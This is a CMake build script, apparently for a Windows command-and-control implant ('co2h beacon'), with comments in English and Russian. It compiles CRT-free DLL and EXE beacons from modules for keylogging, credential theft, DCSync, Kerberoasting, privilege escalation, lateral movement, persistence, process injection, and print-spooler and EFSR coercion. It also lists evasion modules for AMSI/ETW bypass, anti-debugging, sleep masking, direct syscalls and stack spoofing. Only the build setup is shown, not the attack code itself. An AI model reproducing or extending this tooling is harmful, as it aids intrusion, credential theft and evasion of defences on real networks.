# Debug builds add /RTC1 which requires CRT — strip it for the no-CRT beacon.
string(REPLACE "/RTC1" "" CMAKE_C_FLAGS_DEBUG   "${CMAKE_C_FLAGS_DEBUG}")
string(REPLACE "/RTC1" "" CMAKE_CXX_FLAGS_DEBUG "${CMAKE_CXX_FLAGS_DEBUG}")




# MASM: x64 (ml64.exe) и x86 (ml.exe).
enable_language(ASM_MASM)

# Sources shared between DLL and EXE beacons (no entry point)
set(BEACON_CORE_SOURCES
    loader/loader.c
    loader/migrate.c
    core/main.c
    core/tasking.c
    core/transport.c
    core/crypto_bcrypt.c
    core/alloc.c
    core/rt.c
    core/metadata.c
    transports/https/transport_https.c
    transports/tcp/transport_tcp.c
    transports/smb/transport_smb.c
    transports/dns/transport_dns.c
    commands/cmd_sys.c
    commands/cmd_fs.c
    commands/cmd_ps.c
    commands/cmd_shell.c
    commands/cmd_ishell.c
    commands/cmd_token.c
    commands/cmd_pivot.c
    commands/cmd_inject.c
    commands/cmd_inject_dll.c
    commands/cmd_modulestomp.c
    commands/cmd_execasm.c
    commands/cmd_creds.c
    commands/cmd_privesc.c
    commands/cmd_privesc_plasma.c
    commands/cmd_ldap_relay.c
    commands/cmd_dcsync.c
    commands/cmd_kerberoast.c
    commands/cmd_screenshot.c
    commands/cmd_persist.c
    commands/cmd_rportfwd.c
    commands/cmd_lateral.c
    commands/cmd_portfwd.c
    commands/cmd_portscan.c
    commands/cmd_keylogger.c
    commands/cmd_socks.c
    commands/cmd_relay.c
    commands/cmd_stager.c
    commands/cmd_adcs_enum.c
    commands/cmd_edge_creds.c
    commands/efsr_c.c
    commands/rprn_c.c
    commands/drsuapi_c.c
    bof/bof_loader.c
    opsec/api_hash.c
    opsec/etw_amsi.c
    opsec/antidbg.c
    opsec/sleepmask_ekko.c
    opsec/process_inject_kit.c
    opsec/syscalls.c
    opsec/stack_spoof.c
)

# ASM syscall stubs — только для x64 (ml64.exe синтаксис, x86 не поддерживает).
# На x86 Nt*_i — это inline-обёртки над WinAPI (см. beacon.h).
if(CMAKE_SIZEOF_VOID_P EQUAL 8)
    list(APPEND BEACON_CORE_SOURCES opsec/syscall_stubs.asm)
    # Выравнивающая обёртка вызова BOF entry point (x64 ABI требует RSP & 0xF == 0).
    list(APPEND BEACON_CORE_SOURCES bof/bof_call.asm)
else()
    # x86 обёртка с ручным SEH (FS:[0]) — __try/__except без CRT недоступен.
    list(APPEND BEACON_CORE_SOURCES bof/bof_call_x86.asm)
endif()

# Run MIDL to regenerate rprn stubs (MS-RPRN Print Spooler coercion).
add_custom_command(
    OUTPUT
        ${CMAKE_CURRENT_SOURCE_DIR}/commands/rprn_c.c
        ${CMAKE_CURRENT_SOURCE_DIR}/commands/rprn.h
    COMMAND midl
        /client stub /server none /nologo /app_config
        /out "${CMAKE_CURRENT_SOURCE_DIR}/commands"
        "${CMAKE_CURRENT_SOURCE_DIR}/commands/rprn.idl"
    DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/commands/rprn.idl"
    COMMENT "MIDL: generating MS-RPRN stubs"
    VERBATIM
)
set_source_files_properties(commands/rprn_c.c PROPERTIES
    COMPILE_OPTIONS "$<$<COMPILE_LANGUAGE:C>:/Oi-;/wd4206>"
)

# Run MIDL to generate DRSUAPI stubs (MS-DRSR DCSync).
add_custom_command(
    OUTPUT
        ${CMAKE_CURRENT_SOURCE_DIR}/commands/drsuapi_c.c
        ${CMAKE_CURRENT_SOURCE_DIR}/commands/drsuapi.h
    COMMAND midl
        /client stub /server none /nologo /app_config
        /out "${CMAKE_CURRENT_SOURCE_DIR}/commands"
        "${CMAKE_CURRENT_SOURCE_DIR}/commands/drsuapi.idl"
    DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/commands/drsuapi.idl"
    COMMENT "MIDL: generating MS-DRSR stubs"
    VERBATIM
)
set_source_files_properties(commands/drsuapi_c.c PROPERTIES
    COMPILE_OPTIONS "$<$<COMPILE_LANGUAGE:C>:/Oi-;/wd4206>"
)

# Run MIDL to regenerate efsr stubs from idl source.
# Output goes to commands/ next to efsr.idl so efsr_c.c finds efsr.h via relative include.
add_custom_command(
    OUTPUT
        ${CMAKE_CURRENT_SOURCE_DIR}/commands/efsr_c.c
        ${CMAKE_CURRENT_SOURCE_DIR}/commands/efsr.h
    COMMAND midl
        /client stub /server none /nologo
        /out "${CMAKE_CURRENT_SOURCE_DIR}/commands"
        "${CMAKE_CURRENT_SOURCE_DIR}/commands/efsr.idl"
    DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/commands/efsr.idl"
    COMMENT "MIDL: generating MS-EFSR stubs"
    VERBATIM
)

# /Oi- запрещает MSVC превращать rl_memcpy/rl_memset в intrinsic rep movsb.
set_source_files_properties(loader/loader.c PROPERTIES
    COMPILE_OPTIONS "$<$<COMPILE_LANGUAGE:C>:/Oi->"
)

# efsr_c.c is MIDL-generated and includes <string.h>; /Oi- prevents intrinsic
# expansion of memcpy/memset which would pull in CRT references.
set_source_files_properties(commands/efsr_c.c PROPERTIES
    COMPILE_OPTIONS "$<$<COMPILE_LANGUAGE:C>:/Oi-;/wd4206>"
)

# x86 без CRT: принудительно включить 64-битные арифметические хелперы из rt.obj.
# /OPT:REF выбрасывает их как «неиспользуемые» — компилятор генерирует вызовы
# неявно, и линкер не видит прямых ссылок до этапа удаления.
if(NOT CMAKE_SIZEOF_VOID_P EQUAL 8)
    set(CMAKE_EXE_LINKER_FLAGS    "${CMAKE_EXE_LINKER_FLAGS} /INCLUDE:__allmul /INCLUDE:__aullshr /INCLUDE:__aulldvrm")
    set(CMAKE_SHARED_LINKER_FLAGS "${CMAKE_SHARED_LINKER_FLAGS} /INCLUDE:__allmul /INCLUDE:__aullshr /INCLUDE:__aulldvrm")
endif()

# ---- shared compile/link helpers -------------------------------------------

macro(beacon_common_settings target)
    target_include_directories(${target} PRIVATE
        ${CMAKE_CURRENT_SOURCE_DIR}
        ${CMAKE_CURRENT_SOURCE_DIR}/core
        ${CMAKE_CURRENT_SOURCE_DIR}/opsec
    )
    target_compile_definitions(${target} PRIVATE
        _CRT_SECURE_NO_WARNINGS
        WIN32_LEAN_AND_MEAN
        CO2H_BEACON
        CO2H_NO_CRT
        $<$<CONFIG:Debug>:BEACON_DEBUG>
    )
    # Применяем флаги C/C++-компилятора только к C/C++-файлам,
    # иначе MASM получает их и отвергает (LNK1181: .obj не создан).
    target_compile_options(${target} PRIVATE
        $<$<COMPILE_LANGUAGE:C,CXX>:/GS->
        $<$<COMPILE_LANGUAGE:C,CXX>:/Gs9999999>
        $<$<COMPILE_LANGUAGE:C,CXX>:/Gy>
        $<$<COMPILE_LANGUAGE:C,CXX>:/Zl>
        $<$<COMPILE_LANGUAGE:C,CXX>:/GR->
        $<$<COMPILE_LANGUAGE:C,CXX>:/EHs-c->
        $<$<AND:$<COMPILE_LANGUAGE:C,CXX>,$<CONFIG:Debug>>:/Zi>
    )
    target_link_libraries(${target} PRIVATE
        kernel32 ntdll bcrypt ncrypt winhttp advapi32 user32 gdi32 ws2_32 ole32 oleaut32 secur32 rpcrt4 netapi32 wldap32 crypt32 psapi
    )
endmacro()

# Имя файла зависит от разрядности: beacon64 для x64, beacon32 для x86.
if(CMAKE_SIZEOF_VOID_P EQUAL 8)
    set(BEACON_OUTPUT_NAME "beacon64")
else()
    set(BEACON_OUTPUT_NAME "beacon32")
endif()

# ---- DLL beacon ------------------------------------------------------------

add_library(co2h_beacon SHARED ${BEACON_CORE_SOURCES} core/entry.c)

set_target_properties(co2h_beacon PROPERTIES
    OUTPUT_NAME "${BEACON_OUTPUT_NAME}"
    PREFIX ""
    C_STANDARD 11
)
beacon_common_settings(co2h_beacon)
target_link_options(co2h_beacon PRIVATE
    /NODEFAULTLIB /ENTRY:DllEntry /SUBSYSTEM:WINDOWS
    /DYNAMICBASE /NXCOMPAT /MERGE:.rdata=.text
    /FILEALIGN:512 /MANIFEST:NO /OPT:REF /OPT:ICF /DEBUG:NONE
    /IGNORE:4078   # .sleep$z (MASM) vs .sleep (C code_seg) — разный CNT флаг, безвредно
    $<$<EQUAL:${CMAKE_SIZEOF_VOID_P},4>:/SAFESEH:NO>  # x86: ручной SEH в bof_call_x86.asm
)

# ---- EXE beacon ------------------------------------------------------------

add_executable(co2h_beacon_exe ${BEACON_CORE_SOURCES} loader/exe_entry.c beacon.rc)

set_target_properties(co2h_beacon_exe PROPERTIES
    OUTPUT_NAME "${BEACON_OUTPUT_NAME}"
    C_STANDARD 11
)
beacon_common_settings(co2h_beacon_exe)
target_link_options(co2h_beacon_exe PRIVATE
    /NODEFAULTLIB /ENTRY:BeaconExeEntry /SUBSYSTEM:WINDOWS
    /DYNAMICBASE /NXCOMPAT /MERGE:.rdata=.text
    /FILEALIGN:512 /MANIFEST:NO /OPT:REF /OPT:ICF /DEBUG:NONE
    /IGNORE:4078   # .sleep$z (MASM) vs .sleep (C code_seg) — разный CNT флаг, безвредно
    $<$<EQUAL:${CMAKE_SIZEOF_VOID_P},4>:/SAFESEH:NO>  # x86: ручной SEH в bof_call_x86.asm
)
